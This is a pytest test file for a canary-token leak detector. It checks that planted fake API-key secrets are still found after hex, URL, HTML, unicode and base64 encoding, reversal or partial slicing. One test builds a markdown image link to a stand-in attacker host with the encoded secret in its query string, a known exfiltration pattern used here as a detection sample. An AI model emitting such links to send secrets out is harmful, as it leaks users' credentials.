import base64
import json
from collections.abc import Callable
from urllib.parse import quote

import pytest

from canary_ci.canary.normalizers import NormalizerPipeline, PrecomputedCanarySignatures
from canary_ci.canary.seeder import CanarySeeder, GeneratedCanary
from canary_ci.core.models import CanaryKind, CanaryPreset, CanarySpec


@pytest.fixture
def canary() -> GeneratedCanary:
    spec = CanarySpec(
        id="sample", kind=CanaryKind.SECRET, format_preset=CanaryPreset.API_KEY_STRIPE
    )
    return CanarySeeder.generate_all([spec], "fixture-seed", "fixture-scenario", 0)["sample"]


def percent_encode(value: str) -> str:
    return "".join(f"%{byte:02X}" for byte in value.encode())


@pytest.mark.parametrize(
    ("render", "transform"),
    [
        (lambda value: value, "exact"),
        (str.upper, "case_folded"),
        (lambda value: value[::-1], "reversed"),
        (lambda value: value.encode().hex().upper(), "hex_encoded"),
        (percent_encode, "url_decoded"),
        (lambda value: quote(percent_encode(value), safe=""), "url_decoded"),
        (lambda value: "".join(f"&#x{ord(char):x};" for char in value), "html_unescaped"),
        (lambda value: "".join(f"\\u{ord(char):04x}" for char in value), "unicode_json_unescaped"),
        (lambda value: "".join(f"\\x{ord(char):02x}" for char in value), "unicode_json_unescaped"),
        (lambda value: " - ".join(value), "alnum_stripped"),
    ],
)
def test_scan_text_detects_transformed_canaries(
    canary: GeneratedCanary, render: Callable[[str], str], transform: str
) -> None:
    matches = NormalizerPipeline.scan_text(render(canary.full_value), {canary.id: canary})

    assert [(match.canary_id, match.transform_name) for match in matches] == [
        (canary.id, transform)
    ]


@pytest.mark.parametrize(("key", "offset"), [("a", 0), ("ab", 1), ("abc", 2)])
def test_base64_forward_signatures_match_each_json_alignment(
    canary: GeneratedCanary, key: str, offset: int
) -> None:
    data = json.dumps({key: canary.full_value}, separators=(",", ":")).encode()
    encoded = base64.b64encode(data).decode()
    signatures = PrecomputedCanarySignatures(canary)

    assert data.index(canary.full_value.encode()) % 3 == offset
    assert any(signature in encoded for signature in signatures.base64_3_offset)
    matches = NormalizerPipeline.scan_text(encoded, {canary.id: canary})
    assert [(match.canary_id, match.transform_name) for match in matches] == [
        (canary.id, "base64_3_offset")
    ]


def test_urlsafe_base64_in_markdown_image(canary: GeneratedCanary) -> None:
    decoded = f"AA>{canary.full_value}"
    encoded = base64.urlsafe_b64encode(decoded.encode()).decode().rstrip("=")
    markdown = f"![ok](https://evil.invalid/p.png?d={encoded})"

    assert "-" in encoded
    views = NormalizerPipeline.expand_views(markdown)
    assert ("markdown_urls", encoded) in views
    assert ("embedded_base64_blobs", decoded) in views
    matches = NormalizerPipeline.scan_text(markdown, {canary.id: canary})
    assert [match.canary_id for match in matches] == [canary.id]


def test_extracts_markdown_url_path_query_and_fragment() -> None:
    url = "https://fixture.invalid/path-segment?d=query-value#fragment"
    views = NormalizerPipeline.expand_views(f"[link]({url})", max_depth=1)

    assert ("markdown_urls", url) in views
    assert ("markdown_urls", "path-segment") in views
    assert ("markdown_urls", "query-value") in views
    assert ("markdown_urls", "fragment") in views


def test_recursion_stops_at_two_decoding_steps(canary: GeneratedCanary) -> None:
    once = percent_encode(canary.full_value)
    twice = quote(once, safe="")
    three_times = quote(twice, safe="")

    assert ("url_decoded", canary.full_value) not in NormalizerPipeline.expand_views(three_times)
    assert ("url_decoded", once) in NormalizerPipeline.expand_views(three_times, max_depth=10)
    assert NormalizerPipeline.expand_views(three_times, max_depth=0) == [("raw", three_times)]


@pytest.mark.parametrize("slice_start", [0, 4, 12])
def test_scan_text_detects_partial_core_slices(canary: GeneratedCanary, slice_start: int) -> None:
    fragment = canary.core_token[slice_start : slice_start + 12]
    matches = NormalizerPipeline.scan_text(f"fragment: {fragment}", {canary.id: canary})

    assert [(match.transform_name, match.matched_snippet) for match in matches] == [
        ("partial_core_slice", fragment)
    ]


def test_full_decoded_match_takes_priority_over_earlier_partial(canary: GeneratedCanary) -> None:
    text = f"{canary.core_token[:12]} {percent_encode(canary.full_value)}"
    matches = NormalizerPipeline.scan_text(text, {canary.id: canary})

    assert [(match.transform_name, match.matched_snippet) for match in matches] == [
        ("url_decoded", canary.full_value)
    ]


@pytest.mark.parametrize(
    "text",
    [
        "The report is ready. Please check the account and attach the monthly summary.",
        "550e8400-e29b-41d4-a716-446655440000",
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        '{"email":"reports@fixture.invalid","ids":["job-10","job-11"],"approved":true}',
    ],
)
def test_benign_corpus_has_no_matches(canary: GeneratedCanary, text: str) -> None:
    assert NormalizerPipeline.scan_text(text, {canary.id: canary}) == []
